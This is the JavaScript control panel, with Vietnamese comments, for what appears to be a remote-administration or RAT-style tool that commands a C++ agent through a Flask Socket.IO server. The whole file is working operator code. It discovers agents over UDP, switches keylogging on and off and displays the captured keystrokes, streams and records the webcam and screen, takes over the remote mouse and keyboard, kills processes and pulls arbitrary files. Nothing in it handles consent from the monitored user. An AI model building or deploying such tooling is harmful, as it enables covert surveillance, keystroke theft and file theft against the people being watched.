let socket;
const discoveredIPs = new Set();
let isKeylogging = false;
let isCamRecording = false;
let lastRecordingName = "";

let isRemoteControlActive = false;
let lastMoveTime = 0; 
const MOUSE_THROTTLE_MS = 50; // Giới hạn gửi gói tin chuột (50ms/lần)

document.addEventListener('DOMContentLoaded', (event) => {
    // 1. Kết nối tới Flask Server
    socket = io.connect('http://' + document.domain + ':' + location.port);

    // --- CÁC SỰ KIỆN TỪ SERVER (LISTENERS) ---

    // A. Trạng thái kết nối
    socket.on('status', function(data) {
        const msgElement = document.getElementById('connection_msg');
        const globalBadge = document.getElementById('global_status');
        
        if (msgElement) {
            msgElement.textContent = data.msg;
            msgElement.className = data.status === 'success' ? 'text-success font-weight-bold' : 'text-danger font-weight-bold';
        }
        if (globalBadge) {
            if (data.status === 'success') {
                globalBadge.className = 'badge badge-success p-2';
                globalBadge.textContent = 'Connected';
            } else if (data.status === 'error') {
                globalBadge.className = 'badge badge-danger p-2';
                globalBadge.textContent = 'Disconnected';
            }
        }
    });

    // B. Nhận dữ liệu (Keylog text hoặc JSON Process)
    socket.on('agent_json', function(rawMsg) {
        // XỬ LÝ KEYLOGGER
        if (typeof rawMsg === 'string' && rawMsg.startsWith("KEYLOGS:")) {
            const content = rawMsg.substring(8); // Cắt bỏ "KEYLOGS:"
            
            const area = document.getElementById('txtKeylogs');
            if (area) {
                if (content === "[BACK]") {
                    area.value = area.value.slice(0, -1);
                } else {
                    let displayContent = content;
                    if (content === "[ENTER]\n") displayContent = "\n";
                    else if (content === "[TAB]") displayContent = "\t";
                    area.value += displayContent;
                }
                area.scrollTop = area.scrollHeight;
            }
            // Hiệu ứng bàn phím ảo
            highlightKey(content);
            return; 
        }
        if (typeof rawMsg === 'string') {
        // 1. Nhận tên file từ C++
            if (rawMsg.startsWith("FILENAME:")) {
                lastRecordingName = rawMsg.substring(9);
                console.log("Đã nhận tên file: " + lastRecordingName);
                return;
            }

            // 2. Nhận tín hiệu đã lưu xong file
            if (rawMsg === "CAM_REC_STOPPED" || rawMsg.includes("Webcam recording stopped")) {
                const btnDown = document.getElementById("btnDownloadRec");
                if (btnDown && lastRecordingName) {
                    btnDown.style.display = 'inline-block';
                    btnDown.className = "btn btn-warning btn-sm pulse-animation"; // Làm nút nổi bật lên
                    btnDown.innerHTML = `<i class="fas fa-download"></i> Save: ${lastRecordingName}`;
                }
                return;
            }
        }

        // XỬ LÝ JSON (Process List / App List)
        try {
            const data = (typeof rawMsg === 'object') ? rawMsg : JSON.parse(rawMsg);
            if (Array.isArray(data)) {
                if (data.length === 0) return;
                // Phân biệt App list và Process list dựa trên field có sẵn
                if (data[0].hasOwnProperty('path') || data[0].hasOwnProperty('isRunning')) {
                    updateAppTable(data); 
                } 
                else {
                    updateProcessTable(data); 
                }
            } 
            else if (data.file_content) {
                handleFileContent(data);
            } 
            else if (typeof data === 'string' && data.startsWith("Started App")) {
                alert(data);
            }
        } 
        catch (e) {
            console.error("Lỗi xử lý dữ liệu từ Agent:", e, rawMsg);
        }
    });

    // C. Nhận hình ảnh (Stream)
    socket.on('agent_image', function(base64Image) {
        const imgElement = document.getElementById('live_feed');
        if (imgElement) imgElement.src = `data:image/jpeg;base64,${base64Image}`;
    });

    // D. Auto Discovery (UDP)
    socket.on('discovery_found', function(agentInfo) {
        if (discoveredIPs.has(agentInfo.ip)) return;
        discoveredIPs.add(agentInfo.ip);

        const tableBody = document.querySelector('#discovery_table tbody');
        if (!tableBody) return;

        const emptyRow = document.getElementById('empty_row');
        if (emptyRow) emptyRow.remove();

        const row = tableBody.insertRow();
        row.insertCell().textContent = agentInfo.ip;
        
        const nameCell = row.insertCell();
        nameCell.innerHTML = `<b>${agentInfo.hostname}</b>`;

        const methodCell = row.insertCell();
        methodCell.innerHTML = `<span class="badge badge-success">Auto (UDP)</span>`;
        
        const actionCell = row.insertCell();
        const btn = document.createElement('button');
        btn.className = 'btn btn-primary btn-sm';
        btn.innerHTML = '<i class="fas fa-bolt"></i> Connect';
        btn.onclick = function() {
            document.getElementById('agent_ip').value = agentInfo.ip;
            if (agentInfo.port) {
            document.getElementById('agent_port').value = agentInfo.port; 
            }
            connectAgent(); 
        };
        actionCell.appendChild(btn);
    });

    // --- KHỞI TẠO EVENT LISTENERS CHO REMOTE CONTROL ---
    initRemoteControlListeners();
});

// ---Ự ĐỘNG NGẮT KẾT NỐI KHI REFRESH / ĐÓNG TAB ---
window.addEventListener('beforeunload', function (e) {
    // Gửi lệnh tắt các tính năng tốn tài nguyên
    if(socket && socket.connected) {
        socket.emit('send_command', { cmd: 'CMD_CLOSE_SCREEN' });
        socket.emit('send_command', { cmd: 'CMD_CLOSE_CAM' });
        
        socket.disconnect();
    }
});

// --- CÁC HÀM GỬI LỆNH (ACTIONS) ---

function connectAgent() {
    const ip = document.getElementById('agent_ip').value;
    const port = document.getElementById('agent_port').value;
    socket.emit('connect_agent', { ip: ip, port: port });
    const msg = document.getElementById('connection_msg');
    if(msg) msg.textContent = "Connecting...";
}

function sendCommand(cmd) {
    if (socket && socket.connected) {
        socket.emit('send_command', { cmd: cmd });
    } else {
        console.warn("Chưa kết nối tới Server Flask, không thể gửi lệnh: " + cmd);
    }
}

// ---HÀM BẮT ĐẦU STREAM VÀ HIỆN NÚT REMOTE ---
function startScreenStream() {
    // Đảm bảo nút Record Webcam biến mất khi chuyển sang Screen
    const btnRecord = document.getElementById('btnRecordCam');
    if (btnRecord) btnRecord.style.display = 'none';
    if (isCamRecording) toggleCamRecording();

    sendCommand('CMD_CLOSE_CAM');

    setTimeout(() => {
        sendCommand('CMD_OPEN_SCREEN');
        const btnRemote = document.getElementById('btnRemoteToggle');
        if (btnRemote) {
            btnRemote.style.display = 'inline-block';
            btnRemote.classList.add('pulse-animation');
        }
    }, 300);
}

// Hàm Bật/Tắt Keylogger
function toggleKeylogger() {
    const btn = document.getElementById("btnKeylogToggle");
    
    if (!isKeylogging) {
        sendCommand("KEYLOGGING_ON");
        isKeylogging = true;
        if(btn) {
            btn.innerHTML = '<i class="fas fa-stop"></i> Stop';
            btn.classList.remove("btn-warning");
            btn.classList.add("btn-danger");
        }
    } else {
        sendCommand("KEYLOGGING_OFF");
        isKeylogging = false;
        if(btn) {
            btn.innerHTML = '<i class="fas fa-play"></i> Start';
            btn.classList.remove("btn-danger");
            btn.classList.add("btn-warning");
        }
    }
}

function clearKeylog() {
    const area = document.getElementById("txtKeylogs");
    if(area) area.value = "";
}

// --- VISUAL KEYBOARD HIGHLIGHTER ---
function highlightKey(inputKey) {
    if (!inputKey) return;
    let targetKey = "";

    // Map keys
    if (inputKey === "[BACK]") targetKey = "BACKSPACE";
    else if (inputKey.includes("[ENTER]")) targetKey = "ENTER";
    else if (inputKey === " ") targetKey = "SPACE";
    else if (inputKey === "[TAB]") targetKey = "TAB";
    else if (inputKey === "[ESC]") targetKey = "ESC";
    else if (inputKey === "[UP]") targetKey = "UP";
    else if (inputKey === "[DOWN]") targetKey = "DOWN";
    else if (inputKey === "[LEFT]") targetKey = "LEFT";
    else if (inputKey === "[RIGHT]") targetKey = "RIGHT";
    else if (inputKey === "[DEL]") targetKey = "DELETE";
    else if (inputKey === "[INS]") targetKey = "INSERT";
    else if (inputKey === "[HOME]") targetKey = "HOME";
    else if (inputKey === "[END]") targetKey = "END";
    else if (inputKey === "[PGUP]") targetKey = "PAGEUP";
    else if (inputKey === "[PGDN]") targetKey = "PAGEDOWN";
    else if (inputKey.match(/^\[F\d+\]$/)) targetKey = inputKey.replace("[", "").replace("]", "");
    else targetKey = inputKey.toUpperCase();

    // Find & Highlight
    let $keyElement = $(`.key[data-key='${targetKey}']`);
    if ($keyElement.length === 0) {
        const specialCharMap = {
            '!': '1', '@': '2', '#': '3', '$': '4', '%': '5', '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
            '_': '-', '+': '=', '{': '[', '}': ']', '|': '\\', ':': ';', '"': "'", '<': ',', '>': '.', '?': '/'
        };
        if (specialCharMap[inputKey]) {
            $keyElement = $(`.key[data-key='${specialCharMap[inputKey]}']`);
        }
    }

    if ($keyElement.length > 0) {
        $keyElement.addClass('active');
        setTimeout(() => { $keyElement.removeClass('active'); }, 150);
    }
}

// --- APP & PROCESS TABLE UPDATES ---

function updateProcessTable(processes) {
    const tableBody = document.querySelector('#process_table tbody');
    if (!tableBody) return;
    tableBody.innerHTML = ''; 
    
    processes.forEach(p => {
        const row = tableBody.insertRow();
        row.insertCell().textContent = p.pid;
        row.insertCell().textContent = p.name;
        
        const actionCell = row.insertCell();
        const killButton = document.createElement('button');
        killButton.className = 'btn btn-danger btn-xs';
        killButton.innerHTML = '<i class="fas fa-times"></i> Kill';
        killButton.onclick = () => {
            if(confirm(`Kill process ${p.name} (${p.pid})?`)) {
                sendCommand(`TASK_KILL ${p.pid}`);
            }
        };
        actionCell.appendChild(killButton);
    });
}

function updateAppTable(apps) {
    const tableBody = document.querySelector('#app_table tbody');
    if (!tableBody) return;
    tableBody.innerHTML = '';

    apps.forEach(app => {
        const row = tableBody.insertRow();
        row.insertCell().textContent = app.name;
        
        const pathCell = row.insertCell();
        pathCell.textContent = app.path;
        pathCell.style.fontSize = '0.85rem';
        pathCell.style.maxWidth = '300px';
        pathCell.style.overflow = 'hidden';
        pathCell.style.textOverflow = 'ellipsis';
        pathCell.title = app.path;

        const statusCell = row.insertCell();
        statusCell.innerHTML = app.isRunning ? 
            `<span class="badge badge-success">Running (PID: ${app.pid})</span>` : 
            `<span class="badge badge-secondary">Stopped</span>`;

        const actionCell = row.insertCell();
        if (app.isRunning) {
            const stopBtn = document.createElement('button');
            stopBtn.className = 'btn btn-danger btn-xs';
            stopBtn.innerHTML = '<i class="fas fa-stop"></i> Stop';
            stopBtn.onclick = () => {
                if(confirm(`Dừng ứng dụng ${app.name}?`)) {
                    sendCommand(`APP_STOP ${app.pid}`);
                    setTimeout(() => sendCommand('APP_LIST'), 1000);
                }
            };
            actionCell.appendChild(stopBtn);
        } else {
            const startBtn = document.createElement('button');
            startBtn.className = 'btn btn-success btn-xs';
            startBtn.innerHTML = '<i class="fas fa-play"></i> Start';
            startBtn.onclick = () => {
                sendCommand(`APP_START ${app.path}`);
                setTimeout(() => sendCommand('APP_LIST'), 2000);
            };
            actionCell.appendChild(startBtn);
        }
    });
}

// --- UTILS ---
function killProcess() {
    const val = document.getElementById('pid_kill').value;
    if (val) sendCommand(`TASK_KILL ${val}`);
}

function startAppInput() {
    const val = document.getElementById('app_start').value;
    if (val) sendCommand(`APP_START ${val}`);
}

function clearDiscoveryTable() {
    discoveredIPs.clear();
    const tbody = document.querySelector('#discovery_table tbody');
    if(tbody) tbody.innerHTML = '<tr id="empty_row"><td colspan="4" class="text-center text-muted">Đang chờ tín hiệu Agent...</td></tr>';
}

function handleFileContent(data) {
    const statusDiv = document.getElementById('file_download_status');

    if (data.file_content === "ERROR") {
        alert("Lỗi: Agent không tìm thấy file hoặc không thể đọc file.");
        if(statusDiv) statusDiv.innerHTML = '<span class="text-danger">Tải thất bại.</span>';
        return;
    }

    try {
        // Chuyển Base64 thành mảng Byte
        const byteCharacters = atob(data.file_content);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        
        // Tạo Blob (Binary Large Object) từ mảng Byte
        const blob = new Blob([byteArray], { type: "application/octet-stream" });
        const url = URL.createObjectURL(blob);

        // Tạo thẻ 'a' ảo để kích hoạt download
        const a = document.createElement('a');
        a.href = url;
        a.download = data.file_name || "downloaded_file.avi";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        if(statusDiv) statusDiv.innerHTML = '<span class="text-success">Đã tải xong! Kiểm tra thư mục Download.</span>';
        console.log("Tải file thành công: " + a.download);
    } catch (e) {
        console.error("Lỗi giải mã file:", e);
        if(statusDiv) statusDiv.innerHTML = '<span class="text-danger">Lỗi định dạng file.</span>';
    }
}

function confirmAction(cmd) {
    if (confirm("Bạn có chắc chắn muốn thực hiện hành động này không?")) {
        sendCommand(cmd);
    }
}


// --- LOGIC REMOTE CONTROL ---

// Hàm Bật/Tắt Remote Control
function toggleRemoteControl() {
    const btn = document.getElementById('btnRemoteToggle');
    const imgElement = document.getElementById('live_feed');
    
    // Đảo trạng thái
    isRemoteControlActive = !isRemoteControlActive;

    if (isRemoteControlActive) {

        if(btn) {
            btn.classList.remove('btn-outline-primary');
            btn.classList.add('btn-primary'); 
            btn.innerHTML = '<i class="fas fa-mouse-pointer"></i> Control: ON';
        }
        // Focus vào ảnh để nhận sự kiện phím ngay lập tức
        if(imgElement) imgElement.focus();
        
    } else {
        // TRẠNG THÁI: TẮT
        if(btn) {
            btn.classList.remove('btn-primary');
            btn.classList.add('btn-outline-primary');
            btn.innerHTML = '<i class="fas fa-mouse-pointer"></i> Remote Control';
        }
    }
}

// Hàm khởi tạo Event Listeners (Chỉ chạy 1 lần)
function initRemoteControlListeners() {
    const imgElement = document.getElementById('live_feed');
    if (!imgElement) return;

    // Ngăn menu chuột phải
    imgElement.addEventListener('contextmenu', (e) => {
        if (isRemoteControlActive) e.preventDefault();
    });

    // 1. CHUỘT: MOVE
    imgElement.addEventListener('mousemove', (e) => {
        if (!isRemoteControlActive) return;

        const now = Date.now();
        if (now - lastMoveTime < MOUSE_THROTTLE_MS) return;
        lastMoveTime = now;

        const coords = getScaledCoordinates(imgElement, e);
        sendCommand(`MOUSE_MOVE ${coords.x} ${coords.y}`);
    });

    // 2. CHUỘT: CLICK (DOWN)
    imgElement.addEventListener('mousedown', (e) => {
        if (!isRemoteControlActive) return;
        e.preventDefault();
        
        let btnType = 0; // Left
        if (e.button === 2) btnType = 1; // Right
        else if (e.button === 1) btnType = 2; // Middle

        sendCommand(`MOUSE_CLICK ${btnType} 1`);
    });

    // 3. CHUỘT: RELEASE (UP)
    imgElement.addEventListener('mouseup', (e) => {
        if (!isRemoteControlActive) return;
        e.preventDefault();

        let btnType = 0; 
        if (e.button === 2) btnType = 1;
        else if (e.button === 1) btnType = 2;

        sendCommand(`MOUSE_CLICK ${btnType} 0`);
    });

    // 4. CHUỘT: SCROLL
    imgElement.addEventListener('wheel', (e) => {
        if (!isRemoteControlActive) return;
        e.preventDefault();
        // Cuộn lên/xuống (120/-120)
        const scrollAmount = (e.deltaY > 0) ? -120 : 120;
        sendCommand(`MOUSE_SCROLL ${scrollAmount}`);
    }, { passive: false });

    // 5. BÀN PHÍM: KEY DOWN
    window.addEventListener('keydown', (e) => {
        if (!isRemoteControlActive) return;
        if (e.key === 'F5' || e.key === 'F12') return; // Cho phép refresh/debug

        e.preventDefault(); 
        const winKeyCode = mapJsKeyCodeToWin(e);
        if (winKeyCode !== 0) sendCommand(`KEY_EVENT ${winKeyCode} 1`);
    });

    // 6. BÀN PHÍM: KEY UP
    window.addEventListener('keyup', (e) => {
        if (!isRemoteControlActive) return;
        if (e.key === 'F5' || e.key === 'F12') return;

        e.preventDefault();
        const winKeyCode = mapJsKeyCodeToWin(e);
        if (winKeyCode !== 0) sendCommand(`KEY_EVENT ${winKeyCode} 0`);
    });
}

// Hàm tính toán tọa độ chuột
function getScaledCoordinates(imgElem, event) {
    const rect = imgElem.getBoundingClientRect();
    
    // Tọa độ chuột trên thẻ <img>
    const clientX = event.clientX - rect.left;
    const clientY = event.clientY - rect.top;

    // Tỉ lệ scale (Nếu C++ gửi ảnh full size thì để 1.0)
    const scaleFactorCplusPlus = 1.0; 

    // Tính toán tỉ lệ giữa kích thước hiển thị và kích thước thật của ảnh
    const scaleX = (imgElem.naturalWidth / rect.width) * scaleFactorCplusPlus;
    const scaleY = (imgElem.naturalHeight / rect.height) * scaleFactorCplusPlus;

    return {
        x: Math.round(clientX * scaleX),
        y: Math.round(clientY * scaleY)
    };
}

// Hàm map phím JS -> Windows VK Code
function mapJsKeyCodeToWin(e) {
    const code = e.keyCode || e.which;
    return code;
}


// --- [MỚI] HÀM MỞ CAMERA AN TOÀN (Tránh xung đột với Screen Stream) ---
function startCameraStream() {
    const imgElement = document.getElementById('live_feed');
    const btnRecord = document.getElementById('btnRecordCam'); // Nút record trong HTML
    
    console.log("Đang chuyển sang chế độ Camera...");
    
    // 1. Dọn dẹp UI và hiện nút Record
    if (imgElement) {
        imgElement.src = ""; 
        imgElement.alt = "Đang khởi tạo Camera... Vui lòng đợi.";
    }
    
    // HIỆN nút Record khi bật Cam
    if (btnRecord) {
        btnRecord.style.display = 'inline-block';
    }

    // 2. Tắt Screen Stream nếu đang bật
    sendCommand('CMD_CLOSE_SCREEN');

    // 3. Tắt Remote Control
    const btnRemote = document.getElementById('btnRemoteToggle');
    if (btnRemote) btnRemote.style.display = 'none';
    isRemoteControlActive = false;

    // 4. Đợi một chút rồi mới mở Cam
    setTimeout(() => {
        sendCommand('CMD_OPEN_CAM');
    }, 300);
}


function stopCameraStream() {
    console.log("Đang yêu cầu tắt Camera...");
    const btnRecord = document.getElementById('btnRecordCam');

    // 1. NẾU ĐANG QUAY PHIM: Phải dừng quay trước khi tắt Cam để Agent lưu file an toàn
    if (isCamRecording) {
        toggleCamRecording(); 
    }

    // 2. ẨN nút Record khi tắt Cam
    if (btnRecord) {
        btnRecord.style.display = 'none';
    }

    // 3. Gửi lệnh tắt cho C++ Agent
    sendCommand('CMD_CLOSE_CAM');

    // 4. Xóa hình ảnh hiển thị
    const imgElement = document.getElementById('live_feed');
    if (imgElement) {
        imgElement.src = "";
        imgElement.alt = "Camera đã tắt.";
    }
}


function stopScreenStream() {
    console.log("Đang yêu cầu tắt Screen Stream...");

    // 1. Gửi lệnh tắt cho C++ Agent
    sendCommand('CMD_CLOSE_SCREEN');

    // 2. Xóa hình ảnh đang hiện trên thẻ img (tránh lộ ảnh cuối)
    const imgElement = document.getElementById('live_feed');
    if (imgElement) {
        imgElement.src = ""; 
        imgElement.alt = "Screen Stream đã tắt.";
    }

    // 3. Ẩn nút Remote Control và reset trạng thái
    const btnRemote = document.getElementById('btnRemoteToggle');
    if (btnRemote) {
        btnRemote.style.display = 'none';
        btnRemote.classList.remove('btn-primary');
        btnRemote.classList.add('btn-outline-primary');
        btnRemote.innerHTML = '<i class="fas fa-mouse-pointer"></i> Remote Control';
    }
    isRemoteControlActive = false;
}


function takeSnapshot() {
    const imgElement = document.getElementById('live_feed');
    
    // Kiểm tra xem có ảnh đang hiển thị không
    if (!imgElement || !imgElement.src || imgElement.src === "" || imgElement.src.includes('window.location')) {
        alert("Không có hình ảnh hiện tại để lưu!");
        return;
    }

    try {
        // Tạo một thẻ link ẩn để trigger trình duyệt tải xuống
        const link = document.createElement('a');
        link.href = imgElement.src; // Dữ liệu base64 hiện tại
        
        // Đặt tên file theo thời gian hiện tại để không bị trùng
        const date = new Date();
        const timestamp = `${date.getFullYear()}${date.getMonth()+1}${date.getDate()}_${date.getHours()}${date.getMinutes()}${date.getSeconds()}`;
        link.download = `Snapshot_${timestamp}.jpg`;
        
        // Trigger tải xuống
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        console.log("Đã lưu ảnh snapshot: " + link.download);
    } catch (e) {
        console.error("Lỗi khi lưu ảnh:", e);
        alert("Không thể lưu ảnh. Vui lòng thử lại.");
    }
}


function toggleCamRecording() {
    const btn = document.getElementById("btnRecordCam");
    const btnDown = document.getElementById("btnDownloadRec");
    if (!btn) return;

    if (!isCamRecording) {
        // Bắt đầu quay
        sendCommand("CAM_REC_START");
        isCamRecording = true;
        btn.innerHTML = '<i class="fas fa-stop-circle"></i> Stop Record';
        btn.classList.replace("btn-info", "btn-danger");
        btn.classList.add("pulse-animation");
        
        // Ẩn nút tải cũ nếu đang hiện
        if (btnDown) btnDown.style.display = 'none';
    } else {
        // Dừng quay
        sendCommand("CAM_REC_STOP");
        isCamRecording = false;
        btn.innerHTML = '<i class="fas fa-video"></i> Record Webcam';
        btn.classList.replace("btn-danger", "btn-info");
        btn.classList.remove("pulse-animation");
        
        // MẸO: Hiện nút tải ngay khi bấm dừng để trải nghiệm mượt hơn
        if (btnDown && lastRecordingName) {
            btnDown.style.display = 'inline-block';
            btnDown.innerHTML = `<i class="fas fa-download"></i> Save: ${lastRecordingName}`;
        }
    }
}

function pullFile(fileName) {
    if (!fileName) {
        fileName = document.getElementById('file_path').value; // Lấy từ input nếu không có tham số
    }
    if (fileName) {
        console.log("Yêu cầu tải file: " + fileName);
        sendCommand(`FILE_PULL ${fileName}`);
        
        // Hiển thị trạng thái đang tải trên giao diện
        const statusDiv = document.getElementById('file_download_status');
        if(statusDiv) statusDiv.innerHTML = '<span class="text-warning"><i class="fas fa-sync fa-spin"></i> Đang lấy dữ liệu file từ Agent...</span>';
    }
}